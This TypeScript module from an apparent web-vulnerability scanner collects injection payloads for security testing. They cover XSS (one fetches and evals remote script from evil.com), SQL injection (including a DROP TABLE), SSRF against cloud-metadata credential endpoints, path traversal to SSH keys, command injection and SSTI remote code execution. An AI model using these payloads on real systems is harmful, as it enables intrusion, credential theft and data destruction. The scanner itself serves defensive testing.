// ============================================================
// InjectProof — Core Payload Definitions
// Extended payload generators with real-world payloads curated from:
//   - https://github.com/swisskyrepo/PayloadsAllTheThings (MIT)
//   - https://github.com/ihebski/XSS-Payloads
//   - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
//   - https://github.com/thevillagehacker/Bug-Hunting-Arsenal
//   - https://github.com/MrPr0fessor/Google-Dorks-for-Cross-site-Scripting-XSS
//   - https://github.com/payload-box/xss-payload-list
//   - https://github.com/yogsec/XSS-Payloads
//   - https://github.com/yogsec/SQL-Injection-Payloads
//   - https://github.com/Ninja-Yubaraj/SQL-Injection-Payloads-List
//   - https://dev.to/deoxys/sql-injection-all-concepts-all-payloads-all-in-one-4ch5
//   - https://medium.com/@theSorcerer/crafting-sql-injection-payloads-5892a83b6bc6
// ============================================================

// ============================================================
// Payload Source Registry — Industry-Standard Attribution
// Each entry follows OWASP / Nuclei / ZAP conventions for
// source traceability, licensing, and vulnerability categorisation.
// ============================================================

export type PayloadSourceType = 'repository' | 'article' | 'cheat-sheet';

export interface PayloadSource {
    /** Short unique id (kebab-case) */
    id: string;
    /** Human-readable name */
    name: string;
    /** Canonical URL */
    url: string;
    /** Primary vulnerability categories covered */
    categories: string[];
    /** Source format */
    type: PayloadSourceType;
    /** License if known */
    license: string;
    /** Brief description */
    description: string;
}

/**
 * Canonical registry of every external source whose payloads are
 * loaded by this module.  Deeply crawled (every file, every line)
 * by `scripts/fetch_payloads.mjs`; extracted data lives in
 * `src/scanner/data/*.json`.
 *
 * Use `PAYLOAD_SOURCES` for attribution in scan reports, audit logs,
 * and compliance documentation.
 */
export const PAYLOAD_SOURCES: readonly PayloadSource[] = [
    {
        id: 'payloads-all-the-things',
        name: 'PayloadsAllTheThings',
        url: 'https://github.com/swisskyrepo/PayloadsAllTheThings',
        categories: ['xss', 'sqli', 'ssrf', 'ssti', 'cmd-injection', 'path-traversal', 'open-redirect', 'cors', 'deserialization'],
        type: 'repository',
        license: 'MIT',
        description: 'Comprehensive payload collection for web application security testing (XSS, SQLi, SSRF, SSTI, Command Injection, etc.).',
    },
    {
        id: 'ihebski-xss',
        name: 'ihebski/XSS-Payloads',
        url: 'https://github.com/ihebski/XSS-Payloads',
        categories: ['xss'],
        type: 'repository',
        license: 'MIT',
        description: 'Curated collection of XSS payloads for fun and profit — filter bypass, DOM-based, and event-handler vectors.',
    },
    {
        id: 'portswigger-xss-cheatsheet',
        name: 'PortSwigger XSS Cheat Sheet',
        url: 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet',
        categories: ['xss'],
        type: 'cheat-sheet',
        license: 'Proprietary (public reference)',
        description: 'PortSwigger authoritative XSS cheat sheet — event handlers, tags, encoding bypass, and browser-specific vectors.',
    },
    {
        id: 'bug-hunting-arsenal',
        name: 'Bug Hunting Arsenal',
        url: 'https://github.com/thevillagehacker/Bug-Hunting-Arsenal',
        categories: ['xss', 'sqli', 'ssrf', 'open-redirect', 'recon'],
        type: 'repository',
        license: 'MIT',
        description: 'Multi-category payload arsenal for bug bounty hunters — recon, injection, SSRF, redirect, and IDOR payloads.',
    },
    {
        id: 'google-dorks-xss',
        name: 'Google Dorks for XSS',
        url: 'https://github.com/MrPr0fessor/Google-Dorks-for-Cross-site-Scripting-XSS',
        categories: ['xss', 'recon', 'dorks'],
        type: 'repository',
        license: 'MIT',
        description: 'Google Dork queries specifically crafted to discover XSS-vulnerable web pages via search engine reconnaissance.',
    },
    {
        id: 'payload-box-xss',
        name: 'payload-box/xss-payload-list',
        url: 'https://github.com/payload-box/xss-payload-list',
        categories: ['xss'],
        type: 'repository',
        license: 'MIT',
        description: 'Ultimate XSS payload list and learning hub — Reflected, Stored, and DOM-based XSS vectors.',
    },
    {
        id: 'yogsec-xss',
        name: 'yogsec/XSS-Payloads',
        url: 'https://github.com/yogsec/XSS-Payloads',
        categories: ['xss'],
        type: 'repository',
        license: 'MIT',
        description: 'Modern XSS payloads covering WAF bypass, polyglots, blind XSS, and framework-specific vectors.',
    },
    {
        id: 'yogsec-sqli',
        name: 'yogsec/SQL-Injection-Payloads',
        url: 'https://github.com/yogsec/SQL-Injection-Payloads',
        categories: ['sqli'],
        type: 'repository',
        license: 'MIT',
        description: 'Multi-DBMS SQL injection payloads — MySQL, MSSQL, PostgreSQL, Oracle — error-based, time-based, UNION, and WAF bypass.',
    },
    {
        id: 'ninja-yubaraj-sqli',
        name: 'Ninja-Yubaraj/SQL-Injection-Payloads-List',
        url: 'https://github.com/Ninja-Yubaraj/SQL-Injection-Payloads-List',
        categories: ['sqli'],
        type: 'repository',
        license: 'MIT',
        description: 'Exhaustive SQL injection payload list with generic, error-based, boolean-blind, and time-based techniques.',
    },
    {
        id: 'deoxys-sqli-article',
        name: 'SQL Injection: All Concepts, All Payloads, All In One',
        url: 'https://dev.to/deoxys/sql-injection-all-concepts-all-payloads-all-in-one-4ch5',
        categories: ['sqli'],
        type: 'article',
        license: 'CC (public article)',
        description: 'Comprehensive DEV.to guide covering UNION, error-based, blind, time-based, and OOB SQL injection with ready-to-use payloads.',
    },
    {
        id: 'thesorcerer-sqli-article',
        name: 'Crafting SQL Injection Payloads',
        url: 'https://medium.com/@theSorcerer/crafting-sql-injection-payloads-5892a83b6bc6',
        categories: ['sqli'],
        type: 'article',
        license: 'CC (public article)',
        description: 'Medium article on advanced SQLi payload crafting techniques, filter evasion, and real-world exploitation patterns.',
    },
] as const;

/** Flat array of all source URLs — convenience export for reports */
export const PAYLOAD_REFERENCE_URLS: readonly string[] = PAYLOAD_SOURCES.map(s => s.url);

/** @deprecated Use `PAYLOAD_SOURCES[0].url` or find by id instead */
export const PAT_REFERENCE = PAYLOAD_SOURCES[0].url;

// Cache for loaded external payloads (avoid re-reading per call)
const _externalCache = new Map<string, string[]>();

/**
 * Load external payloads from JSON files generated by `scripts/fetch_payloads.mjs`.
 * Uses dynamic `require` to avoid Next.js client-side bundling errors with `fs`.
 * Results are cached in-memory after the first load.
 */
function loadExternalPayloads(fileName: string, probeToken?: string): string[] {
    const cacheKey = `${fileName}::${probeToken ?? ''}`;
    if (_externalCache.has(cacheKey)) return _externalCache.get(cacheKey)!;

    try {
        // Dynamic require so Next.js doesn't bundle fs/path for the browser
        // eslint-disable-next-line @typescript-eslint/no-var-requires
        const fs = require('fs') as typeof import('fs');
        // eslint-disable-next-line @typescript-eslint/no-var-requires
        const path = require('path') as typeof import('path');

        const filePath = path.join(process.cwd(), 'src', 'scanner', 'data', fileName);
        if (fs.existsSync(filePath)) {
            const content = fs.readFileSync(filePath, 'utf-8');
            const data: string[] = JSON.parse(content);
            const result = probeToken
                ? data.map((c) => c.replace(/\$\{probeToken\}/g, probeToken))
                : data;
            _externalCache.set(cacheKey, result);
            return result;
        }
    } catch {
        // Silently fail: file not generated yet, browser context, or edge runtime
    }
    return [];
}

/**
 * Generate a unique probe token for canary-based detection.
 * Used to verify if user input is reflected in responses.
 */
export function generateProbeToken(): string {
    return `vc${Date.now().toString(36)}${Math.random().toString(36).slice(2, 8)}`;
}

// ============================================================
// XSS — PayloadsAllTheThings: XSS Injection/README.md
// Categories: Common, HTML5 tags, SVG, Div events, IMG, DOM,
//             JS context, hidden input, remote JS, encoding
// ============================================================

/**
 * XSS payload collection — tests reflection and script execution vectors.
 * Ref: PayloadsAllTheThings/XSS Injection
 */
export function getXssPayloads(probeToken: string): string[] {
    const basePayloads = [
        // --- Original payloads ---
        `<script>alert('${probeToken}')</script>`,
        `<img src=x onerror=alert('${probeToken}')>`,
        `<svg onload=alert('${probeToken}')>`,
        `<body onload=alert('${probeToken}')>`,
        `"><script>alert('${probeToken}')</script>`,
        `'><script>alert('${probeToken}')</script>`,
        `<img src=x onerror="alert('${probeToken}')">`,
        `<svg/onload=alert('${probeToken}')>`,
        `javascript:alert('${probeToken}')`,
        `<iframe src="javascript:alert('${probeToken}')">`,
        `"><img src=x onerror=alert('${probeToken}')>`,
        `'"><svg/onload=alert('${probeToken}')>`,
        `<details open ontoggle=alert('${probeToken}')>`,
        `<marquee onstart=alert('${probeToken}')>`,
        `<input onfocus=alert('${probeToken}') autofocus>`,
        // --- PAT: Common payloads ---
        `<scr<script>ipt>alert('${probeToken}')</scr</script>ipt>`,
        `"><script>alert(String.fromCharCode(88,83,83))</script>`,
        `<script>\\u0061lert('${probeToken}')</script>`,
        `<script>eval('\\x61lert(\\'${probeToken}\\')')</script>`,
        `<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;1&#x29;">`,
        // --- PAT: IMG variants ---
        `<img src=x onerror=alert(String.fromCharCode(88,83,83));>`,
        `<img src=x:alert(alt) onerror=eval(src) alt=${probeToken}>`,
        `<><img src=1 onerror=alert('${probeToken}')>`,
        // --- PAT: SVG variants ---
        `<svg id=alert(1) onload=eval(id)>`,
        `<svg><script>alert('${probeToken}')</script>`,
        `<svg><script>alert&lpar;'${probeToken}'&rpar;`,
        // --- PAT: HTML5 tags ---
        `<body onload=alert(/XSS/.source)>`,
        `<select autofocus onfocus=alert('${probeToken}')>`,
        `<textarea autofocus onfocus=alert('${probeToken}')>`,
        `<video/poster/onerror=alert('${probeToken}')>`,
        `<video><source onerror="javascript:alert('${probeToken}')">`,
        `<video src=_ onloadstart="alert('${probeToken}')">`,
        `<audio src onloadstart=alert('${probeToken}')>`,
        `<meter value=2 min=0 max=10 onmouseover=alert('${probeToken}')>2 out of 10</meter>`,
        // --- PAT: Div pointer events ---
        `<div onpointerover="alert('${probeToken}')">MOVE HERE</div>`,
        `<div onpointerdown="alert('${probeToken}')">MOVE HERE</div>`,
        `<div onpointerenter="alert('${probeToken}')">MOVE HERE</div>`,
        // --- PAT: Hidden input ---
        `<input type="hidden" accesskey="X" onclick="alert('${probeToken}')">`,
        `<input type="hidden" oncontentvisibilityautostatechange="alert('${probeToken}')" style="content-visibility:auto">`,
        // --- PAT: DOM Based ---
        `#"><img src=/ onerror=alert('${probeToken}')>`,
        // --- PAT: JS context ---
        `-(confirm)('${probeToken}')//`,
        `; alert('${probeToken}');//`,
        // --- PAT: XSS using remote JS ---
        `<svg/onload='fetch("//evil.com").then(r=>r.text().then(t=>eval(t)))'>`,
        // --- PAT: Touch events (mobile) ---
        `<body ontouchstart=alert('${probeToken}')>`,
        `<body ontouchend=alert('${probeToken}')>`,
        // --- PAT: Uppercase bypass via HTML entities ---
        `<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;('${probeToken}')>`,
    ];
    return [...basePayloads, ...loadExternalPayloads('xss-payloads.json', probeToken)];
}

// ============================================================
// SQLi — PayloadsAllTheThings + yogsec + Ninja-Yubaraj + dev.to
// Categories: Auth bypass, UNION, Error-based (MySQL/MSSQL/PgSQL/Oracle),
//             Boolean blind, Time-based blind, WAF bypass, stacked queries
// ============================================================

/**
 * SQL Injection payload collection — comprehensive multi-DBMS payloads.
 * Ref: PayloadsAllTheThings/SQL Injection, yogsec/SQL-Injection-Payloads,
 *      Ninja-Yubaraj/SQL-Injection-Payloads-List, dev.to/deoxys
 */
export function getSqliPayloads(): string[] {
    const basePayloads = [
        // --- Original payloads ---
        `'`,
        `"`,
        `' OR '1'='1`,
        `' OR '1'='1' --`,
        `' OR '1'='1' /*`,
        `" OR "1"="1`,
        `' UNION SELECT NULL--`,
        `' UNION SELECT NULL,NULL--`,
        `' UNION SELECT NULL,NULL,NULL--`,
        `1' ORDER BY 1--`,
        `1' ORDER BY 10--`,
        `' AND 1=1--`,
        `' AND 1=2--`,
        `'; WAITFOR DELAY '0:0:5'--`,
        `' AND SLEEP(5)--`,
        `1; SELECT pg_sleep(5)--`,
        `' UNION SELECT username,password FROM users--`,
        `admin'--`,
        `1 OR 1=1`,
        `' OR 'x'='x`,
        // --- PAT: Auth bypass ---
        `' or 1=1 limit 1 --`,
        `' OR '1'='1' #`,
        `' OR 1=1#`,
        `admin' #`,
        `admin'/*`,
        `' OR 1=1-- -`,
        `" OR 1=1-- -`,
        `'='`,
        `'LIKE'`,
        `'=0--+`,
        `") OR ("1"="1`,
        `') OR ('1'='1`,
        // --- PAT: UNION column enumeration ---
        `1' ORDER BY 1--+`,
        `1' ORDER BY 2--+`,
        `1' ORDER BY 3--+`,
        `' UNION SELECT 1,2,3--`,
        `' UNION SELECT 1,2,3,4--`,
        `' UNION SELECT 1,2,3,4,5--`,
        `' UNION SELECT NULL,NULL,NULL,NULL--`,
        `' UNION SELECT table_name FROM information_schema.tables--`,
        // --- yogsec: Error-based MySQL ---
        `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))#`,
        `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER())),1)#`,
        `' UNION SELECT 1,@@version#`,
        `' AND EXP(~0)#`,
        // --- yogsec: Error-based MSSQL ---
        `' AND 1=CONVERT(int,(SELECT @@version))--`,
        `' AND 1=CONVERT(int,(SELECT SYSTEM_USER))--`,
        `' OR 1=CONVERT(int,(SELECT host_name()))--`,
        `' UNION SELECT @@version--`,
        `' UNION SELECT DB_NAME()--`,
        // --- yogsec: Error-based PostgreSQL ---
        `' AND 1=CAST(version() AS INTEGER)--`,
        `' AND 1=CAST(current_database() AS INTEGER)--`,
        `' AND 1=CAST(current_user AS INTEGER)--`,
        `' UNION SELECT version();--`,
        `' UNION SELECT current_database();--`,
        // --- yogsec: Error-based Oracle ---
        `' UNION SELECT banner FROM v$version--`,
        `' UNION SELECT user FROM dual--`,
        // --- PAT: Error-based extraction ---
        `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`,
        `LIMIT CAST((SELECT version()) as numeric)`,
        // --- yogsec: Time-based MySQL ---
        `' AND IF(1=1, SLEEP(5), 0) --`,
        `' AND IF(1=2, SLEEP(5), 0) --`,
        `' AND BENCHMARK(5000000, MD5('A')) --`,
        `' OR SLEEP(5) --`,
        // --- yogsec: Time-based MSSQL ---
        `' WAITFOR DELAY '00:00:05' --`,
        `'; IF (1=1) WAITFOR DELAY '00:00:05' --`,
        `'; IF (1=2) WAITFOR DELAY '00:00:05' --`,
        // --- yogsec: Time-based PostgreSQL ---
        `' AND pg_sleep(5) --`,
        `' OR pg_sleep(5) --`,
        // --- yogsec: Time-based Oracle ---
        `' AND DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`,
        `' OR DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`,
        // --- Ninja-Yubaraj: Generic error-based ---
        `OR 1=1`,
        `OR 1=0`,
        `OR x=x`,
        `OR x=y`,
        `HAVING 1=1`,
        `HAVING 1=0`,
        `AND 1=1 AND '%'='`,
        `AND 1=0 AND '%'='`,
        `%' AND 8310=8310 AND '%'='`,
        // --- PAT: Polyglot / stacked ---
        `'; DROP TABLE users--`,
        `1; SELECT 1--`,
        // --- yogsec: WAF bypass — inline comments ---
        `/**/UNION/**/SELECT/**/1,2,3--`,
        `UN/**/ION/**/SE/**/LECT/**/1,2,3--`,
        `/*!50000UNION*/SELECT 1,2,3--`,
        // --- yogsec: WAF bypass — encoding ---
        `UNION%0ASELECT%0A1,2,3--`,
        `UNION%09SELECT%091,2,3--`,
        `UNION%0d%0aSELECT%0d%0a1,2,3--`,
        `+UNION+SELECT+1,2,3--`,
        // --- yogsec: WAF bypass — case manipulation ---
        `uNiOn SeLeCt 1,2,3--`,
        `UnIoN sElEcT 1,2,3--`,
        // --- dev.to: Conditional tests ---
        `' AND '1'='1`,
        `' AND '1'='2`,
        // --- Ninja-Yubaraj: Time-based via comma ---
        `,(select * from (select(sleep(10)))a)`,
    ];
    return [...basePayloads, ...loadExternalPayloads('sqli-payloads.json')];
}

// ============================================================
// SSRF — PayloadsAllTheThings: Server Side Request Forgery/README.md
// Categories: Localhost, IPv6, CIDR bypass, encoded IP, domain redirect,
//             rare address, cloud metadata (AWS/GCP/Azure/DO)
// ============================================================

/**
 * SSRF payload collection — comprehensive bypass and cloud metadata vectors.
 * Ref: PayloadsAllTheThings/Server Side Request Forgery
 */
export function getSsrfPayloads(): string[] {
    return [
        // --- Original payloads ---
        'http://127.0.0.1',
        'http://localhost',
        'http://127.0.0.1:80',
        'http://127.0.0.1:443',
        'http://127.0.0.1:8080',
        'http://127.0.0.1:8443',
        'http://[::1]',
        'http://0.0.0.0',
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'file:///etc/passwd',
        'dict://127.0.0.1:6379/info',
        'gopher://127.0.0.1:6379/_INFO',
        // --- PAT: IPv6 bypass ---
        'http://[::]:80/',
        'http://[0000::1]:80/',
        'http://[0:0:0:0:0:ffff:127.0.0.1]',
        'http://[::ffff:127.0.0.1]',
        // --- PAT: CIDR bypass ---
        'http://127.127.127.127',
        'http://127.0.1.3',
        'http://127.0.0.0',
        // --- PAT: Rare / shorthand address ---
        'http://0/',
        'http://127.1',
        'http://127.0.1',
        // --- PAT: Decimal IP encoding ---
        'http://2130706433/',       // 127.0.0.1
        'http://3232235521/',       // 192.168.0.1
        'http://2852039166/',       // 169.254.169.254
        // --- PAT: Octal IP encoding ---
        'http://0177.0.0.1/',
        'http://o177.0.0.1/',
        // --- PAT: Hex IP encoding ---
        'http://0x7f000001',        // 127.0.0.1
        'http://0xa9fea9fe',        // 169.254.169.254
        // --- PAT: Domain redirect bypass ---
        'http://localtest.me',
        'http://localh.st',
        'http://127.0.0.1.nip.io',
        // --- PAT: IPv6 hostname ---
        'http://ip6-localhost',
        'http://ip6-loopback',
        // --- PAT: URL encoding bypass ---
        'http://127.0.0.1/%61dmin',
        'http://127.0.0.1/%2561dmin',
        // --- PAT: Cloud metadata — AWS ---
        'http://169.254.169.254/latest/user-data/',
        'http://169.254.169.254/latest/meta-data/hostname',
        'http://169.254.169.254/latest/meta-data/local-ipv4',
        // --- PAT: Cloud metadata — GCP ---
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        'http://metadata.google.internal/computeMetadata/v1/project/project-id',
        // --- PAT: Cloud metadata — Azure ---
        'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01',
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01',
        // --- PAT: Cloud metadata — DigitalOcean ---
        'http://169.254.169.254/metadata/v1/',
        'http://169.254.169.254/metadata/v1/id',
        // --- PAT: Internal services ---
        'http://127.0.0.1:22',
        'http://127.0.0.1:3306',
        'http://127.0.0.1:5432',
        'http://127.0.0.1:6379',
        'http://127.0.0.1:27017',
        'http://127.0.0.1:9200',
        'http://127.0.0.1:11211',
    ];
}

// ============================================================
// Path Traversal — PayloadsAllTheThings: Directory Traversal/README.md
// Categories: Basic, URL encoding, double encoding, unicode,
//             overlong UTF-8, null byte, mangled, reverse proxy
// ============================================================

/**
 * Path Traversal payload collection — comprehensive encoding bypass vectors.
 * Ref: PayloadsAllTheThings/Directory Traversal
 */
export function getPathTraversalPayloads(): string[] {
    return [
        // --- Original payloads ---
        '../../../etc/passwd',
        '..\\..\\..\\windows\\win.ini',
        '....//....//....//etc/passwd',
        '../../../etc/shadow',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '/etc/passwd',
        '\\..\\..\\..\\windows\\win.ini',
        '../../../proc/self/environ',
        '../../../etc/hosts',
        // --- PAT: URL encoding ---
        '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini',
        // --- PAT: Double URL encoding ---
        '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
        '..%255c..%255c..%255c..%255cwindows%255cwin.ini',
        '%252e%252e/%252e%252e/%252e%252e/etc/passwd',
        // --- PAT: Unicode encoding ---
        '%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd',
        '..%u2215..%u2215..%u2215etc%u2215passwd',
        // --- PAT: Overlong UTF-8 ---
        '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
        '%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
        '..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd',
        // --- PAT: Mangled path (WAF bypass) ---
        '..././..././..././etc/passwd',
        '....\\/....\\/....\\/etc/passwd',
        '..../..../..../etc/passwd',
        // --- PAT: Null byte termination ---
        '../../../etc/passwd%00',
        '../../../etc/passwd%00.html',
        '../../../etc/passwd%00.jpg',
        '.%00./.%00./etc/passwd',
        // --- PAT: Reverse proxy (Tomcat/Nginx) ---
        '..;/..;/..;/etc/passwd',
        '..;/..;/..;/windows/win.ini',
        // --- PAT: Windows-specific ---
        '..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '..\\..\\..\\..\\boot.ini',
        // --- PAT: Linux sensitive files ---
        '../../../etc/crontab',
        '../../../etc/resolv.conf',
        '../../../etc/issue',
        '../../../etc/motd',
        '../../../root/.bash_history',
        '../../../root/.ssh/id_rsa',
        '../../../var/log/auth.log',
        '../../../var/log/apache2/access.log',
    ];
}

// ============================================================
// Open Redirect — PayloadsAllTheThings: Open Redirect
// Categories: Protocol-relative, backslash, URL parsing, whitespace, CRLF
// ============================================================

/**
 * Open Redirect payload collection — filter bypass redirect vectors.
 * Ref: PayloadsAllTheThings/Open Redirect
 */
export function getOpenRedirectPayloads(): string[] {
    return [
        // --- Original payloads ---
        'https://evil.com',
        '//evil.com',
        '/\\evil.com',
        'https://evil.com/%2f%2e%2e',
        '////evil.com',
        'https:evil.com',
        '/redirect?url=https://evil.com',
        '/.evil.com',
        'https://evil.com@trusted.com',
        '///evil.com',
        // --- PAT: Protocol-relative & backslash ---
        '\\\\evil.com',
        '\\/\\/evil.com/',
        '/\\/evil.com',
        '//evil.com/%2f%2e%2e',
        // --- PAT: URL parsing discrepancies ---
        'https://trusted.com.evil.com',
        'https://trusted.com%40evil.com',
        'https://trusted.com%2540evil.com',
        'https://evil.com%23@trusted.com',
        'http://evil.com%00@trusted.com',
        // --- PAT: Whitespace bypass ---
        '//evil%E3%80%82com',
        '//%0d%0aevil.com',
        '// evil.com',
        '/%09/evil.com',
        // --- PAT: Data & javascript URI ---
        'data:text/html,<script>window.location="https://evil.com"</script>',
        'javascript:window.location="https://evil.com"',
    ];
}

// ============================================================
// Command Injection — PayloadsAllTheThings: Command Injection/README.md
// Categories: Chaining, backtick, substitution, newline, argument injection,
//             filter bypass (no-space, brace expansion, hex encoding)
// ============================================================

/**
 * Command Injection payload collection — chaining & filter bypass vectors.
 * Ref: PayloadsAllTheThings/Command Injection
 */
export function getCmdInjectionPayloads(probeToken: string): string[] {
    return [
        // --- Original payloads ---
        `; echo ${probeToken}`,
        `| echo ${probeToken}`,
        `\` echo ${probeToken}\``,
        `$(echo ${probeToken})`,
        `& echo ${probeToken}`,
        `&& echo ${probeToken}`,
        `|| echo ${probeToken}`,
        `; id`,
        `| id`,
        `\`id\``,
        `$(id)`,
        `%0aid`,
        `\n id`,
        // --- PAT: Chaining operators ---
        `; whoami`,
        `| whoami`,
        `& whoami`,
        `&& whoami`,
        `|| whoami`,
        `\`whoami\``,
        `$(whoami)`,
        // --- PAT: Newline / carriage return ---
        `%0d%0aid`,
        `%0a whoami`,
        `%0d whoami`,
        // --- PAT: Filter bypass — no space ---
        `{cat,/etc/passwd}`,
        'cat${IFS}/etc/passwd',
        'cat$IFS/etc/passwd',
        `X=$'cat\\x20/etc/passwd'&&$X`,
        // --- PAT: Filter bypass — hex encoding ---
        `echo -e "\\x69\\x64"`,
        `$(printf '\\x69\\x64')`,
        // --- PAT: Filter bypass — brace expansion ---
        `{echo,${probeToken}}`,
        // --- PAT: Filter bypass — wildcard ---
        `/???/??t /???/p??s??`,
        // --- PAT: Argument injection ---
        `--help`,
        `--version`,
        `-o/tmp/proof`,
        // --- PAT: Backgrounding ---
        `; sleep 5 &`,
        `| sleep 5 &`,
    ];
}

// ============================================================
// SSTI — PayloadsAllTheThings: Server Side Template Injection/README.md
// Categories: Universal polyglot, Jinja2, Twig, Freemarker, Thymeleaf,
//             Mako, ERB, error-based detection, math evaluation
// ============================================================

/**
 * SSTI payload collection — multi-engine template injection vectors.
 * Ref: PayloadsAllTheThings/Server Side Template Injection
 */
export function getSstiPayloads(probeToken: string): string[] {
    return [
        // --- Original payloads ---
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '#{7*7}',
        '{7*7}',
        '{{config}}',
        '{{self.__class__.__mro__}}',
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        '{{request.application.__globals__}}',
        '${\"freemarker.template.utility.Execute\"?new()(\"echo ' + probeToken + '\")}',
        '{{' + probeToken + '}}',
        '${' + probeToken + '}',
        // --- PAT: Universal polyglot (trigger error) ---
        '${{<%[%\'"}}%\\.',
        // --- PAT: Math evaluation across engines ---
        '{{7*\'7\'}}',                    // Jinja2 returns 7777777, Twig returns 49
        '{{7*7*7}}',
        '${7*7*7}',
        '#{7*7*7}',
        '<%= 7*7*7 %>',
        // --- PAT: Error-based detection ---
        '{{(1/0).zxy.zxy}}',
        '${(1/0).zxy.zxy}',
        // --- PAT: Jinja2 (Python) ---
        '{{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read()}}',
        '{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__[\"__import__\"](\"os\").popen(\"id\").read()}}{% endif %}{% endfor %}',
        '{{lipsum.__globals__.os.popen(\"id\").read()}}',
        '{{cycler.__init__.__globals__.os.popen(\"id\").read()}}',
        // --- PAT: Twig (PHP) ---
        '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
        '{{[\"id\"]|filter(\"system\")}}',
        // --- PAT: Freemarker (Java) ---
        '<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}',
        '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
        // --- PAT: Thymeleaf (Java / Spring) ---
        '${T(java.lang.Runtime).getRuntime().exec(\"id\")}',
        '__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__::.x',
        // --- PAT: Mako (Python) ---
        '${__import__(\"os\").popen(\"id\").read()}',
        '<%import os;x=os.popen(\"id\").read()%>${x}',
        // --- PAT: ERB (Ruby) ---
        '<%= `id` %>',
        '<%= system(\"id\") %>',
        // --- PAT: Template engine agnostic markers ---
        '{{= 7*7 }}',
        '{= 7*7 }',
        '*{ 7*7 }',
        '@{ 7*7 }',
        '@( 7*7 )',
    ];
}

// ============================================================
// Constants — CORS, Security Headers, Info Disclosure
// ============================================================

/**
 * CORS test origins — used to test for CORS misconfigurations.
 */
export const CORS_TEST_ORIGINS: string[] = [
    'https://evil.com',
    'https://attacker.com',
    'null',
    'https://trusted.com.evil.com',
    'https://trustedcom.evil.com',
    // --- PAT additions ---
    'https://trusted.com%60.evil.com',
    'https://trusted.com_.evil.com',
];

/**
 * Security headers checklist — headers that should be present.
 */
export const SECURITY_HEADERS_CHECKLIST: Array<{ header: string; description: string; critical: boolean }> = [
    { header: 'X-Content-Type-Options', description: 'Prevents MIME type sniffing', critical: true },
    { header: 'X-Frame-Options', description: 'Prevents clickjacking attacks', critical: true },
    { header: 'Strict-Transport-Security', description: 'Enforces HTTPS connections', critical: true },
    { header: 'Content-Security-Policy', description: 'Controls resources the browser can load', critical: true },
    { header: 'X-XSS-Protection', description: 'Enables browser XSS filtering', critical: false },
    { header: 'Referrer-Policy', description: 'Controls referrer information sent with requests', critical: false },
    { header: 'Permissions-Policy', description: 'Controls browser feature access', critical: false },
    { header: 'Cross-Origin-Embedder-Policy', description: 'Controls cross-origin resource embedding', critical: false },
    { header: 'Cross-Origin-Opener-Policy', description: 'Controls cross-origin window interactions', critical: false },
    { header: 'Cross-Origin-Resource-Policy', description: 'Controls cross-origin resource sharing', critical: false },
];

/**
 * Information disclosure headers — headers that reveal server info.
 */
export const INFO_DISCLOSURE_HEADERS: string[] = [
    'Server',
    'X-Powered-By',
    'X-AspNet-Version',
    'X-AspNetMvc-Version',
    'X-Generator',
    'X-Drupal-Cache',
    'X-Varnish',
    'Via',
];

// ============================================================
// InjectProof — Production-Grade Overlay (Non-breaking / Append-only)
// Safe defaults, typed registry, filtering, deterministic shuffle, reporting
// This layer DOES NOT modify existing exports above.
// ============================================================

export type VcSeverity = 'info' | 'low' | 'medium' | 'high';
export type VcRiskMode = 'safe' | 'legacy';

export type VcCategory =
    | 'xss'
    | 'sqli'
    | 'ssrf'
    | 'path-traversal'
    | 'open-redirect'
    | 'cmd-injection'
    | 'ssti'
    | 'headers'
    | 'jwt'
    | 'cors'
    | 'deserialization'
    | 'custom';

export type VcContext =
    | 'html'
    | 'attr'
    | 'js'
    | 'url'
    | 'query'
    | 'path'
    | 'header'
    | 'json'
    | 'xml'
    | 'form'
    | 'cookie'
    | 'multipart'
    | 'unknown';

export interface VcPayloadItem {
    id: string;
    category: VcCategory;
    value: string;
    source: 'legacy' | 'overlay';
    riskMode: VcRiskMode; // safe/legacy classification of this item
    severity: VcSeverity;
    contexts: VcContext[];
    tags: string[];
    description?: string;
    requiresProbeToken?: boolean;
    enabled: boolean;
}

export interface VcBuildOptions {
    probeToken?: string;
    includeLegacy?: boolean;          // include old payload arrays
    includeSafeOverlay?: boolean;     // include safe probes defined in overlay
    allowHighRiskLegacy?: boolean;    // false => filters obvious dangerous legacy payloads
    seed?: number;                    // deterministic shuffle seed
    shuffle?: boolean;
    dedupe?: boolean;
    categories?: VcCategory[];
    tagsAny?: string[];
